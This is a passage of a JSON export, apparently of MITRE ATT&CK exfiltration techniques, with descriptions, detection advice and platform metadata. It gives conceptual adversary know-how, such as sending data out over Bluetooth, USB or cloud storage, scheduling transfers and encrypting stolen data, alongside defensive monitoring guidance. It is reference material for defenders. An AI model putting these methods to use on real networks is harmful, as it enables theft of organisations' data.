(e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":236,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":236,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":236,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":237,"name":"T1011 - Exfiltration Over Other Network Medium","sort_id":0,"external_id":"T1011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.<\/p>\n<p>Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and\/or replication of communication interfaces.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":237,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":237,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":237,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":238,"name":"T1052 - Exfiltration Over Physical Medium","sort_id":0,"external_id":"T1052","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":238,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":238,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":238,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":349,"name":"T1029 - Scheduled Transfer","sort_id":0,"external_id":"T1029","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.<\/p>\n<p>When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1041\">Exfiltration Over C2 Channel<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1048\">Exfiltration Over Alternative Protocol<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":349,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":349,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":349,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":396,"name":"T1537 - Transfer Data to Cloud Account","sort_id":0,"external_id":"T1537","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers\/downloads and network-based exfiltration detection.<\/p>\n<p>A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.<\/p>\n<p>Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) <\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. ","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":396,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":396,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":396,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":435,"name":"T1532 - Data Encrypted","sort_id":0,"external_id":"T1532","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file formats that can encrypt files are RAR and zip.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Many encryption mechanisms are built into standard application-accessible APIs, and are therefore undetectable to the end user.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":435,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":435,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":597,"name":"T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol","sort_id":0,"external_id":"T1048.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <\/p>\n<p>Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt\/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. <\/p>\n<p>Network protocols that use asymmetric encryption (such as HTTPS\/TLS\/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":597,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":597,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":597,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":598,"name":"T1011.001 - Exfiltration Over Bluetooth","sort_id":0,"external_id":"T1011.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an attacker may opt to exfiltrate data using a Bluetooth communication channel.<\/p>\n<p>Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and\/or replication of communication interfaces.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":598,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":598,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":598,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":599,"name":"T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol","sort_id":0,"external_id":"T1048.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <\/p>\n<p>Symmetric encryption algorithms are those that use shared or the same keys\/secrets on each end of the channel. This requires an exchange or pre-arranged agreement\/possession of the value used to encrypt and decrypt data. <\/p>\n<p>Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) \n\nArtifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":599,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":599,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":599,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":600,"name":"T1048.003 - Exfiltration Over Unencrypted\/Obfuscated Non-C2 Protocol","sort_id":0,"external_id":"T1048.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <\/p>\n<p>Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding\/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":600,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":600,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":600,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":601,"name":"T1567 - Exfiltration Over Web Service","sort_id":0,"external_id":"T1567","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.<\/p>\n<p>Web service providers also commonly use SSL\/TLS encryption, giving adversaries an added level of protection.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":601,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":601,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":601,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":602,"name":"T1052.001 - Exfiltration over USB","sort_id":0,"external_id":"T1052.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":602,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":602,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":602,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":603,"name":"T1567.002 - Exfiltration to Cloud Storage","sort_id":0,"external_id":"T1567.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.<\/p>\n<p>Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":603,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":603,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":603,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":604,"name":"T1567.001 - Exfiltration to Code Repository","sort_id":0,"external_id":"T1567.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":22,"description":"<p>Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: <a href=\"https:\/\/api.github.com\">https:\/\/api.github.com<\/a>). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.<\/p>\n<p>Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":604,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":604,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":604,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]}]}]}]}